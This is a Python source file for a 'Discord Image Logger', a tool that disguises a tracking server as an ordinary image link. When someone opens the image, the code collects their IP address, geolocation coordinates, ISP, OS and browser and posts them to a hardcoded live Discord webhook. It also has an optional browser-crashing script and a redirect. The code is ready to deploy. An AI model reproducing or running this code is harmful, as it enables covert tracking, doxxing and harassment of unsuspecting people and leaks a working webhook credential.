# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to experiment IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1406553040365817987/6myIu_lwUtWklM04Tvf65kucR5wEK_ZDLpVNVxZ79YcfkrfGQHDxZaYZltNOt-OzLiYT",
    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259880-orig.jpg",  # Added https:// to fix URL

    # CUSTOMIZATION #
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": {
        "doCrashBrowser": False,
        "customMessage": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
    },

    "vpnCheck": 1,

    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

def makeReport(ip, useragent=None):
    if ip is None:
        return

    if ip.startswith(('34', '35', '104')):
        if ip.startswith('104'):
            return
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP**: `{ip}`",
                    }
                ],
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent if useragent else "")

    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"**A User Opened the Original Image!**\n\n**IP Info:**\n"
                               f"> **IP:** `{ip}`\n"
                               f"> **Provider:** `{info.get('isp', 'N/A')}`\n"
                               f"> **ASN:** `{info.get('as', 'N/A')}`\n"
                               f"> **Country:** `{info.get('country', 'N/A')}`\n"
                               f"> **Region:** `{info.get('regionName', 'N/A')}`\n"
                               f"> **City:** `{info.get('city', 'N/A')}`\n"
                               f"> **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`\n"
                               f"> **Timezone:** `{info.get('timezone', 'N/A').split('/')[1].replace('_', ' ') if info.get('timezone') and '/' in info.get('timezone') else 'N/A'} "
                               f"({info.get('timezone', 'N/A').split('/')[0] if info.get('timezone') else ''})`\n"
                               f"> **Mobile:** `{info.get('mobile', 'N/A')}`\n"
                               f"> **VPN:** `{info.get('proxy', 'N/A')}`\n"
                               f"> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`\n\n"
                               f"**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n"
                               f"**User Agent:**\n```\n{useragent}\n```",
            }
        ],
    })

binaries = {
    "normal": requests.get(config["image"]).content,
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        if dic.get("url"):
            try:
                data = requests.get(dic.get("url")).content
            except Exception:
                data = binaries["normal"]
        else:
            data = binaries["normal"]

        ip_header = self.headers.get('x-forwarded-for')
        if ip_header and ip_header.startswith(('35', '34', '104')):
            makeReport(ip_header)
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
        else:
            makeReport(ip_header, self.headers.get('user-agent'))
            datatype = 'image/jpeg'
            if config["crashBrowser"]["doCrashBrowser"]:
                datatype = 'text/html'
                data = (config["crashBrowser"]["customMessage"].encode() +
                        b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>')
            elif config["redirect"]["redirect"]:
                datatype = 'text/html'
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            self.wfile.write(data)

handler = ImageLoggerAPI
